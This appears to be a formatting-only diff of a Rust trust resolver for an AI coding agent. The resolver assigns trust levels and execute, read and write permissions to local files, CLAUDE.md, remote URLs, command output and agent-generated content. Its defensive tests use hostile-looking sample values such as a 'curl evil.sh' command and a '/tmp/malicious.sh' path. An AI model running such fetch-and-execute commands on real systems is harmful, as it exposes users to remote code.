@@ -31,10 +31,10 @@ pub enum TrustLevel {
 impl std::fmt::Display for TrustLevel {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
-            Self::System      => write!(f, "system"),
-            Self::Project     => write!(f, "project"),
+            Self::System => write!(f, "system"),
+            Self::Project => write!(f, "project"),
             Self::UserGranted => write!(f, "user_granted"),
-            Self::Untrusted   => write!(f, "untrusted"),
+            Self::Untrusted => write!(f, "untrusted"),
         }
     }
 }
@@ -68,7 +68,9 @@ pub struct TrustDecision {
 }
 
 impl TrustDecision {
-    pub fn is_trusted(&self) -> bool { self.level <= TrustLevel::Project }
+    pub fn is_trusted(&self) -> bool {
+        self.level <= TrustLevel::Project
+    }
 }
 
 // ─── Content Trust Resolver ───────────────────────────────────────────────────
@@ -84,33 +86,51 @@ pub struct ContentTrustResolver {
 
 impl ContentTrustResolver {
     pub fn new(workspace_root: impl Into<String>) -> Self {
-        Self { workspace_root: workspace_root.into(), granted_paths: Vec::new(), denied_paths: Vec::new() }
+        Self {
+            workspace_root: workspace_root.into(),
+            granted_paths: Vec::new(),
+            denied_paths: Vec::new(),
+        }
     }
 
-    pub fn grant_path(&mut self, path: impl Into<String>) { self.granted_paths.push(path.into()); }
-    pub fn deny_path(&mut self, path: impl Into<String>) { self.denied_paths.push(path.into()); }
+    pub fn grant_path(&mut self, path: impl Into<String>) {
+        self.granted_paths.push(path.into());
+    }
+    pub fn deny_path(&mut self, path: impl Into<String>) {
+        self.denied_paths.push(path.into());
+    }
 
     pub fn resolve(&self, source: ContentSource) -> TrustDecision {
         match &source {
             ContentSource::SystemInjected => TrustDecision {
-                source, level: TrustLevel::System, reason: "system prompt content".into(),
-                allow_execution: true, allow_read: true, allow_write: true,
+                source,
+                level: TrustLevel::System,
+                reason: "system prompt content".into(),
+                allow_execution: true,
+                allow_read: true,
+                allow_write: true,
             },
             ContentSource::LocalFile { path } => {
                 // Denied takes precedence
                 if self.denied_paths.iter().any(|d| path.starts_with(d)) {
                     return TrustDecision {
-                        source, level: TrustLevel::Untrusted,
+                        source,
+                        level: TrustLevel::Untrusted,
                         reason: "path explicitly denied".into(),
-                        allow_execution: false, allow_read: false, allow_write: false,
+                        allow_execution: false,
+                        allow_read: false,
+                        allow_write: false,
                     };
                 }
                 // Explicitly granted
                 if self.granted_paths.iter().any(|g| path.starts_with(g)) {
                     return TrustDecision {
-                        source, level: TrustLevel::UserGranted,
+                        source,
+                        level: TrustLevel::UserGranted,
                         reason: "user-granted path".into(),
-                        allow_execution: true, allow_read: true, allow_write: true,
+                        allow_execution: true,
+                        allow_read: true,
+                        allow_write: true,
                     };
                 }
                 // Inside workspace root
@@ -118,44 +138,72 @@ impl ContentTrustResolver {
                     // System config files get System trust
                     if path.contains("CLAUDE.md") || path.contains(".claude/settings") {
                         return TrustDecision {
-                            source, level: TrustLevel::System,
+                            source,
+                            level: TrustLevel::System,
                             reason: "system configuration file".into(),
-                            allow_execution: false, allow_read: true, allow_write: false,
+                            allow_execution: false,
+                            allow_read: true,
+                            allow_write: false,
                         };
                     }
                     return TrustDecision {
-                        source, level: TrustLevel::Project,
+                        source,
+                        level: TrustLevel::Project,
                         reason: "file within workspace".into(),
-                        allow_execution: false, allow_read: true, allow_write: true,
+                        allow_execution: false,
+                        allow_read: true,
+                        allow_write: true,
                     };
                 }
                 // Outside workspace
                 TrustDecision {
-                    source, level: TrustLevel::Untrusted,
+                    source,
+                    level: TrustLevel::Untrusted,
                     reason: "file outside workspace".into(),
-                    allow_execution: false, allow_read: true, allow_write: false,
+                    allow_execution: false,
+                    allow_read: true,
+                    allow_write: false,
                 }
             }
             ContentSource::RemoteUrl { .. } => TrustDecision {
-                source, level: TrustLevel::Untrusted, reason: "remote URL content".into(),
-                allow_execution: false, allow_read: true, allow_write: false,
+                source,
+                level: TrustLevel::Untrusted,
+                reason: "remote URL content".into(),
+                allow_execution: false,
+                allow_read: true,
+                allow_write: false,
             },
             ContentSource::CommandOutput { .. } => TrustDecision {
-                source, level: TrustLevel::Untrusted, reason: "command output not trusted for execution".into(),
-                allow_execution: false, allow_read: true, allow_write: false,
+                source,
+                level: TrustLevel::Untrusted,
+                reason: "command output not trusted for execution".into(),
+                allow_execution: false,
+                allow_read: true,
+                allow_write: false,
             },
             ContentSource::AgentGenerated => TrustDecision {
-                source, level: TrustLevel::Untrusted, reason: "agent-generated content requires review".into(),
-                allow_execution: false, allow_read: true, allow_write: false,
+                source,
+                level: TrustLevel::Untrusted,
+                reason: "agent-generated content requires review".into(),
+                allow_execution: false,
+                allow_read: true,
+                allow_write: false,
             },
         }
     }
 
     /// Summarise trust level for a list of paths.
     pub fn min_trust_of(&self, paths: &[&str]) -> TrustLevel {
-        paths.iter().map(|p| {
-            self.resolve(ContentSource::LocalFile { path: p.to_string() }).level
-        }).max().unwrap_or(TrustLevel::System)
+        paths
+            .iter()
+            .map(|p| {
+                self.resolve(ContentSource::LocalFile {
+                    path: p.to_string(),
+                })
+                .level
+            })
+            .max()
+            .unwrap_or(TrustLevel::System)
     }
 }
 
@@ -307,21 +355,19 @@ impl TrustResolver {
 
     /// Persist trust state to disk as JSON.
     pub fn persist(&self) -> Result<(), String> {
-        let json = serde_json::to_string_pretty(self)
-            .map_err(|e| format!("serialize error: {e}"))?;
+        let json =
+            serde_json::to_string_pretty(self).map_err(|e| format!("serialize error: {e}"))?;
         if let Some(parent) = self.persist_path.parent() {
             std::fs::create_dir_all(parent).map_err(|e| format!("mkdir error: {e}"))?;
         }
-        std::fs::write(&self.persist_path, json)
-            .map_err(|e| format!("write error: {e}"))
+        std::fs::write(&self.persist_path, json).map_err(|e| format!("write error: {e}"))
     }
 
     /// Load trust state from disk.
     pub fn load(path: &Path) -> Result<Self, String> {
-        let data = std::fs::read_to_string(path)
-            .map_err(|e| format!("read error: {e}"))?;
-        let mut resolver: Self = serde_json::from_str(&data)
-            .map_err(|e| format!("parse error: {e}"))?;
+        let data = std::fs::read_to_string(path).map_err(|e| format!("read error: {e}"))?;
+        let mut resolver: Self =
+            serde_json::from_str(&data).map_err(|e| format!("parse error: {e}"))?;
         resolver.persist_path = path.to_path_buf();
         Ok(resolver)
     }
@@ -336,7 +382,9 @@ mod tests {
 
     // ── ContentTrustResolver tests ────────────────────────────────────────────
 
-    fn content_resolver() -> ContentTrustResolver { ContentTrustResolver::new("/workspace") }
+    fn content_resolver() -> ContentTrustResolver {
+        ContentTrustResolver::new("/workspace")
+    }
 
     #[test]
     fn test_system_injected_trusted() {
@@ -347,7 +395,9 @@ mod tests {
 
     #[test]
     fn test_workspace_file_project_trust() {
-        let r = content_resolver().resolve(ContentSource::LocalFile { path: "/workspace/src/main.rs".into() });
+        let r = content_resolver().resolve(ContentSource::LocalFile {
+            path: "/workspace/src/main.rs".into(),
+        });
         assert_eq!(r.level, TrustLevel::Project);
         assert!(r.allow_read);
         assert!(r.allow_write);
@@ -356,14 +406,18 @@ mod tests {
 
     #[test]
     fn test_claude_md_system_trust() {
-        let r = content_resolver().resolve(ContentSource::LocalFile { path: "/workspace/CLAUDE.md".into() });
+        let r = content_resolver().resolve(ContentSource::LocalFile {
+            path: "/workspace/CLAUDE.md".into(),
+        });
         assert_eq!(r.level, TrustLevel::System);
         assert!(!r.allow_write);
     }
 
     #[test]
     fn test_outside_workspace_untrusted() {
-        let r = content_resolver().resolve(ContentSource::LocalFile { path: "/tmp/malicious.sh".into() });
+        let r = content_resolver().resolve(ContentSource::LocalFile {
+            path: "/tmp/malicious.sh".into(),
+        });
         assert_eq!(r.level, TrustLevel::Untrusted);
         assert!(!r.allow_execution);
         assert!(!r.allow_write);
@@ -371,14 +425,18 @@ mod tests {
 
     #[test]
     fn test_remote_url_untrusted() {
-        let r = content_resolver().resolve(ContentSource::RemoteUrl { url: "https://example.com/script.sh".into() });
+        let r = content_resolver().resolve(ContentSource::RemoteUrl {
+            url: "https://example.com/script.sh".into(),
+        });
         assert_eq!(r.level, TrustLevel::Untrusted);
         assert!(!r.allow_execution);
     }
 
     #[test]
     fn test_command_output_untrusted() {
-        let r = content_resolver().resolve(ContentSource::CommandOutput { command: "curl evil.sh".into() });
+        let r = content_resolver().resolve(ContentSource::CommandOutput {
+            command: "curl evil.sh".into(),
+        });
         assert_eq!(r.level, TrustLevel::Untrusted);
         assert!(!r.allow_execution);
     }
@@ -393,7 +451,9 @@ mod tests {
     fn test_granted_path_user_trust() {
         let mut res = content_resolver();
         res.grant_path("/tmp/approved");
-        let r = res.resolve(ContentSource::LocalFile { path: "/tmp/approved/file.rs".into() });
+        let r = res.resolve(ContentSource::LocalFile {
+            path: "/tmp/approved/file.rs".into(),
+        });
         assert_eq!(r.level, TrustLevel::UserGranted);
     }
 
@@ -401,7 +461,9 @@ mod tests {
     fn test_denied_path_overrides_workspace() {
         let mut res = content_resolver();
         res.deny_path("/workspace/dist");
-        let r = res.resolve(ContentSource::LocalFile { path: "/workspace/dist/bundle.js".into() });
+        let r = res.resolve(ContentSource::LocalFile {
+            path: "/workspace/dist/bundle.js".into(),
+        });
         assert_eq!(r.level, TrustLevel::Untrusted);
     }
 
@@ -410,15 +472,21 @@ mod tests {
         let mut res = content_resolver();
         res.grant_path("/workspace/dist");
         res.deny_path("/workspace/dist");
-        let r = res.resolve(ContentSource::LocalFile { path: "/workspace/dist/x.js".into() });
+        let r = res.resolve(ContentSource::LocalFile {
+            path: "/workspace/dist/x.js".into(),
+        });
         assert_eq!(r.level, TrustLevel::Untrusted);
     }
 
     #[test]
     fn test_is_trusted_project() {
         let r = TrustDecision {
-            source: ContentSource::AgentGenerated, level: TrustLevel::Project,
-            reason: "".into(), allow_execution: false, allow_read: true, allow_write: true,
+            source: ContentSource::AgentGenerated,
+            level: TrustLevel::Project,
+            reason: "".into(),
+            allow_execution: false,
+            allow_read: true,
+            allow_write: true,
         };
         assert!(r.is_trusted());
     }
@@ -426,8 +494,12 @@ mod tests {
     #[test]
     fn test_is_trusted_false_for_untrusted() {
         let r = TrustDecision {
-            source: ContentSource::AgentGenerated, level: TrustLevel::Untrusted,
-            reason: "".into(), allow_execution: false, allow_read: true, allow_write: false,
+            source: ContentSource::AgentGenerated,
+            level: TrustLevel::Untrusted,
+            reason: "".into(),
+            allow_execution: false,
+            allow_read: true,
+            allow_write: false,
         };
         assert!(!r.is_trusted());
     }
@@ -490,12 +562,18 @@ mod tests {
     #[test]
     fn resolve_unknown_uses_default_policy() {
         let r = resolver(); // default = RequireApproval
-        assert_eq!(r.resolve("/home/user/unknown"), TrustPolicy::RequireApproval);
+        assert_eq!(
+            r.resolve("/home/user/unknown"),
+            TrustPolicy::RequireApproval
+        );
     }
 
     #[test]
     fn canonicalize_strips_trailing_slash() {
-        assert_eq!(TrustResolver::canonicalize_path("/home/user/"), "/home/user");
+        assert_eq!(
+            TrustResolver::canonicalize_path("/home/user/"),
+            "/home/user"
+        );
         assert_eq!(TrustResolver::canonicalize_path("/home/user"), "/home/user");
     }
 
@@ -504,7 +582,10 @@ mod tests {
         let mut r = resolver();
         r.add_allowed("/home/user/safe");
         // "/home/user/safe-imposter" must NOT match "/home/user/safe"
-        assert_ne!(r.resolve("/home/user/safe-imposter"), TrustPolicy::AutoTrust);
+        assert_ne!(
+            r.resolve("/home/user/safe-imposter"),
+            TrustPolicy::AutoTrust
+        );
     }
 
     #[test]
@@ -513,7 +594,11 @@ mod tests {
         let path = tmp.path().to_path_buf();
         let mut r = TrustResolver::new(path.clone());
         r.add_allowed("/home/user/project");
-        r.record_event(TrustEvent::new("/home/user/project", TrustPolicy::AutoTrust, "user confirmed"));
+        r.record_event(TrustEvent::new(
+            "/home/user/project",
+            TrustPolicy::AutoTrust,
+            "user confirmed",
+        ));
         r.persist().unwrap();
         let loaded = TrustResolver::load(&path).unwrap();
         assert_eq!(loaded.allowed_paths, vec!["/home/user/project".to_string()]);
